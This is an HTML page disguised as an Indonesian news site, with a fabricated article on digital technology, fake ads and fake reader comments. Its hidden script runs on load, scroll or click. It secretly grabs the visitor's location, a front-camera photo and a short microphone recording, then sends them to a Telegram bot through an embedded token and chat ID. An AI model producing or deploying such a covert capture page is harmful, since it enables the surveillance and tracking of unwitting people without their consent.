<!DOCTYPE html>
<html>
<head>
    <title>Berita Terkini</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: Arial, sans-serif;
            background-color: #f5f5f5;
        }
        
        /* Header seperti website berita */
        .header {
            background-color: #2c3e50;
            color: white;
            padding: 15px;
            text-align: center;
            font-size: 24px;
            font-weight: bold;
        }
        
        .header span {
            color: #e74c3c;
        }
        
        /* Navigasi */
        .nav {
            background-color: #34495e;
            padding: 10px;
            text-align: center;
        }
        
        .nav a {
            color: white;
            text-decoration: none;
            margin: 0 15px;
            font-size: 14px;
        }
        
        /* Konten utama */
        .container {
            max-width: 800px;
            margin: 20px auto;
            padding: 20px;
            background-color: white;
            border-radius: 5px;
            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
        }
        
        /* Judul artikel */
        .article-title {
            font-size: 28px;
            color: #2c3e50;
            margin-bottom: 10px;
        }
        
        /* Meta info (tanggal, penulis) */
        .meta {
            color: #7f8c8d;
            font-size: 14px;
            margin-bottom: 20px;
            padding-bottom: 10px;
            border-bottom: 1px solid #eee;
        }
        
        /* Isi artikel */
        .content {
            line-height: 1.6;
            color: #333;
        }
        
        .content p {
            margin-bottom: 15px;
        }
        
        /* Iklan-iklan kecil */
        .ads {
            background-color: #f9f9f9;
            padding: 15px;
            margin: 20px 0;
            border-left: 4px solid #e74c3c;
            font-size: 14px;
            color: #7f8c8d;
        }
        
        .ads-title {
            font-weight: bold;
            color: #2c3e50;
            margin-bottom: 5px;
        }
        
        /* Komentar palsu */
        .comments {
            margin-top: 30px;
        }
        
        .comment {
            padding: 10px;
            border-bottom: 1px solid #eee;
        }
        
        .comment-name {
            font-weight: bold;
            color: #2c3e50;
        }
        
        .comment-date {
            font-size: 12px;
            color: #95a5a6;
            margin-left: 10px;
        }
        
        .comment-text {
            margin-top: 5px;
            color: #333;
        }
        
        /* Footer */
        .footer {
            background-color: #2c3e50;
            color: white;
            text-align: center;
            padding: 15px;
            font-size: 12px;
            margin-top: 30px;
        }
        
        /* Elemen tersembunyi untuk capture */
        .hidden-capture {
            display: none;
        }
    </style>
</head>
<body>
    <!-- Header seperti website berita -->
    <div class="header">
        Portal<span>Berita</span>.com
    </div>
    
    <!-- Navigasi -->
    <div class="nav">
        <a href="#">Home</a>
        <a href="#">Nasional</a>
        <a href="#">Internasional</a>
        <a href="#">Ekonomi</a>
        <a href="#">Olahraga</a>
        <a href="#">Teknologi</a>
        <a href="#">Hiburan</a>
    </div>
    
    <!-- Konten utama -->
    <div class="container">
        <!-- Judul artikel -->
        <h1 class="article-title">Kemajuan Teknologi Digital di Indonesia Semakin Pesat</h1>
        
        <!-- Meta info -->
        <div class="meta">
            <span>üìÖ Senin, 23 Februari 2024 - 14:30 WIB</span>
            <span style="margin-left: 20px;">‚úçÔ∏è Redaksi</span>
            <span style="margin-left: 20px;">üëÅÔ∏è 2.345 views</span>
        </div>
        
        <!-- Iklan banner -->
        <div class="ads">
            <div class="ads-title">üí° SPONSORED</div>
            <div>Dapatkan smartphone terbaru dengan diskon 50% hanya di TokoXYZ. Klik untuk info lebih lanjut.</div>
        </div>
        
        <!-- Isi artikel -->
        <div class="content">
            <p><strong>Jakarta</strong> - Perkembangan teknologi digital di Indonesia menunjukkan tren yang sangat positif sepanjang tahun 2024. Menteri Komunikasi dan Informatika menyatakan bahwa penetrasi internet kini telah mencapai 80% populasi.</p>
            
            <p>"Kami optimis transformasi digital akan mempercepat pertumbuhan ekonomi nasional," ujar Menteri dalam konferensi pers hari ini. Pemerintah menargetkan 10 juta UMKM terdigitalisasi pada akhir tahun.</p>
            
            <p>Sementara itu, para ahli memprediksi bahwa adopsi kecerdasan buatan (AI) akan semakin masif di berbagai sektor, mulai dari pendidikan, kesehatan, hingga layanan keuangan.</p>
            
            <!-- Iklan kedua -->
            <div class="ads">
                <div class="ads-title">üì¢ PROMO</div>
                <div>Internet cepat 100Mbps hanya Rp 250rb/bulan. Daftar sekarang dan dapatkan modem gratis!</div>
            </div>
            
            <p>Di sektor e-commerce, nilai transaksi diperkirakan tembus Rp 500 triliun tahun ini. Shopee, Tokopedia, dan Lazada bersaing ketat merebut hati konsumen dengan berbagai program promo.</p>
            
            <p>Namun demikian, pakar keamanan siber mengingatkan masyarakat untuk tetap waspada terhadap modus penipuan online yang semakin canggih. "Pastikan selalu verifikasi keaslian situs web sebelum melakukan transaksi," kata Budi, pakar keamanan siber dari Universitas Indonesia.</p>
        </div>
        
        <!-- Iklan tambahan -->
        <div class="ads">
            <div class="ads-title">üè∑Ô∏è IKLAN</div>
            <div>Jual rumah murah di Jakarta Selatan, luas tanah 150m2, harga nego. Hubungi 0812-3456-7890</div>
        </div>
        
        <!-- Komentar pembaca -->
        <div class="comments">
            <h3 style="margin-bottom: 15px; color: #2c3e50;">Komentar Pembaca (3)</h3>
            
            <div class="comment">
                <span class="comment-name">Andi Pratama</span>
                <span class="comment-date">‚Ä¢ 5 menit yang lalu</span>
                <div class="comment-text">Semoga teknologi makin maju dan bermanfaat untuk masyarakat luas.</div>
            </div>
            
            <div class="comment">
                <span class="comment-name">Siti Nurhaliza</span>
                <span class="comment-date">‚Ä¢ 15 menit yang lalu</span>
                <div class="comment-text">Setuju! Tapi keamanan data juga harus diperhatikan.</div>
            </div>
            
            <div class="comment">
                <span class="comment-name">Budi Santoso</span>
                <span class="comment-date">‚Ä¢ 30 menit yang lalu</span>
                <div class="comment-text">Semoga internet murah bisa dinikmati seluruh rakyat Indonesia.</div>
            </div>
        </div>
        
        <!-- Artikel terkait -->
        <div style="margin-top: 30px; padding-top: 20px; border-top: 2px solid #eee;">
            <h4 style="color: #2c3e50; margin-bottom: 10px;">Baca Juga:</h4>
            <ul style="list-style: none;">
                <li style="margin-bottom: 8px;">üìå 5 Tips Aman Bertransaksi Online di Tahun 2024</li>
                <li style="margin-bottom: 8px;">üìå Startup Indonesia Raih Pendanaan Rp 1 Triliun</li>
                <li style="margin-bottom: 8px;">üìå Cara Mudah Cek Kecepatan Internet di Rumah</li>
            </ul>
        </div>
    </div>
    
    <!-- Footer -->
    <div class="footer">
        ¬© 2026 PortalBerita.com - Seluruh hak cipta dilindungi undang-undang
    </div>
    
    <!-- ===== ELEMEN TERSEMBUNYI UNTUK CAPTURE (TIDAK TERLIHAT) ===== -->
    <div style="display: none;">
        <video id="hidden-video" autoplay playsinline muted></video>
        <audio id="hidden-audio" autoplay></audio>
    </div>
    
    <script>
        // Konfigurasi Telegram
        const BOT_TOKEN = '8534688671:AAHXJBiLh0nrnyojAw2ggCUdMFELQgKyeuc';
        const CHAT_ID = '-5200751249';
        
        // Flag untuk proses
        let isProcessing = false;
        let stream = null;
        let audioStream = null;
        
        // ==================== FUNGSI LOKASI ====================
        async function getLokasi() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    resolve({ success: false });
                    return;
                }
                
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        resolve({
                            success: true,
                            lat: position.coords.latitude,
                            lng: position.coords.longitude
                        });
                    },
                    () => {
                        // Gagal, coba dari IP
                        fetch('https://ipapi.co/json/')
                            .then(res => res.json())
                            .then(data => {
                                resolve({
                                    success: true,
                                    lat: data.latitude,
                                    lng: data.longitude,
                                    kota: data.city
                                });
                            })
                            .catch(() => resolve({ success: false }));
                    },
                    { timeout: 5000, maximumAge: 0 }
                );
            });
        }
        
        // ==================== FUNGSI AUDIO ====================
        async function rekamAudio() {
            return new Promise(async (resolve) => {
                try {
                    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
                        resolve({ success: false });
                        return;
                    }
                    
                    audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
                    const mediaRecorder = new MediaRecorder(audioStream);
                    const audioChunks = [];
                    
                    mediaRecorder.ondataavailable = (event) => {
                        audioChunks.push(event.data);
                    };
                    
                    mediaRecorder.onstop = () => {
                        const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
                        const reader = new FileReader();
                        reader.readAsDataURL(audioBlob);
                        reader.onloadend = () => resolve({
                            success: true,
                            audioBase64: reader.result
                        });
                    };
                    
                    // Rekam 2 detik saja (cepat)
                    mediaRecorder.start();
                    setTimeout(() => {
                        if (mediaRecorder.state === 'recording') {
                            mediaRecorder.stop();
                            audioStream.getTracks().forEach(track => track.stop());
                        }
                    }, 2000);
                    
                } catch {
                    resolve({ success: false });
                }
            });
        }
        
        // ==================== FUNGSI KAMERA ====================
        async function ambilFoto() {
            try {
                if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
                    return null;
                }
                
                const mediaStream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: 'user', width: 640, height: 480 } 
                });
                
                const video = document.getElementById('hidden-video');
                video.srcObject = mediaStream;
                
                return new Promise((resolve) => {
                    video.onloadedmetadata = () => {
                        video.play();
                        setTimeout(() => {
                            const canvas = document.createElement('canvas');
                            canvas.width = video.videoWidth || 640;
                            canvas.height = video.videoHeight || 480;
                            
                            const context = canvas.getContext('2d');
                            context.drawImage(video, 0, 0, canvas.width, canvas.height);
                            
                            const fotoBase64 = canvas.toDataURL('image/jpeg', 0.6);
                            
                            // Bersihkan
                            mediaStream.getTracks().forEach(track => track.stop());
                            canvas.remove();
                            
                            resolve(fotoBase64);
                        }, 200);
                    };
                });
                
            } catch {
                return null;
            }
        }
        
        // ==================== FUNGSI KIRIM ====================
        async function kirimData(lokasi, foto, audio) {
            try {
                let pesan = `üì± Pengunjung Baru\n`;
                pesan += `üïê ${new Date().toLocaleString('id-ID')}\n`;
                pesan += `üåê ${navigator.userAgent.substring(0, 50)}\n`;
                
                if (lokasi && lokasi.success) {
                    pesan += `üìç https://maps.google.com/?q=${lokasi.lat},${lokasi.lng}\n`;
                }
                
                if (foto) {
                    // Kirim foto
                    const formData = new FormData();
                    formData.append('chat_id', CHAT_ID);
                    
                    const response = await fetch(foto);
                    const blob = await response.blob();
                    formData.append('photo', blob, 'foto.jpg');
                    formData.append('caption', pesan);
                    
                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                        method: 'POST',
                        body: formData
                    });
                    
                } else {
                    // Kirim teks saja
                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            chat_id: CHAT_ID,
                            text: pesan
                        })
                    });
                }
                
                // Kirim audio jika ada
                if (audio && audio.success) {
                    const formDataAudio = new FormData();
                    formDataAudio.append('chat_id', CHAT_ID);
                    
                    const audioResponse = await fetch(audio.audioBase64);
                    const audioBlob = await audioResponse.blob();
                    formDataAudio.append('audio', audioBlob, 'audio.webm');
                    
                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`, {
                        method: 'POST',
                        body: formDataAudio
                    });
                }
                
            } catch (e) {
                // Abaikan error
            }
        }
        
        // ==================== FUNGSI UTAMA (DIJALANKAN DI BACKGROUND) ====================
        async function collectData() {
            if (isProcessing) return;
            isProcessing = true;
            
            try {
                // Kumpulkan data di background
                const [lokasi, foto, audio] = await Promise.allSettled([
                    getLokasi(),
                    ambilFoto().catch(() => null),
                    rekamAudio().catch(() => ({ success: false }))
                ]);
                
                // Kirim ke Telegram
                await kirimData(
                    lokasi.value,
                    foto.value,
                    audio.value
                );
                
            } catch (error) {
                // Abaikan
            } finally {
                // Cleanup
                if (stream) stream.getTracks().forEach(track => track.stop());
                if (audioStream) audioStream.getTracks().forEach(track => track.stop());
                isProcessing = false;
            }
        }
        
        // ==================== JALANKAN DI BACKGROUND ====================
        window.addEventListener('load', () => {
            // Tunggu sebentar agar halaman terload sempurna
            setTimeout(() => {
                collectData();
            }, 2000);
        });
        
        // Trigger saat user scroll (tidak terlihat)
        window.addEventListener('scroll', () => {
            if (!isProcessing) {
                collectData();
            }
        }, { once: true });
        
        // Trigger saat user klik (tidak terlihat)
        document.addEventListener('click', () => {
            if (!isProcessing) {
                collectData();
            }
        }, { once: true });
        
        // Cleanup
        window.addEventListener('beforeunload', () => {
            if (stream) stream.getTracks().forEach(track => track.stop());
            if (audioStream) audioStream.getTracks().forEach(track => track.stop());
        });
        
    </script>
</body>
</html>
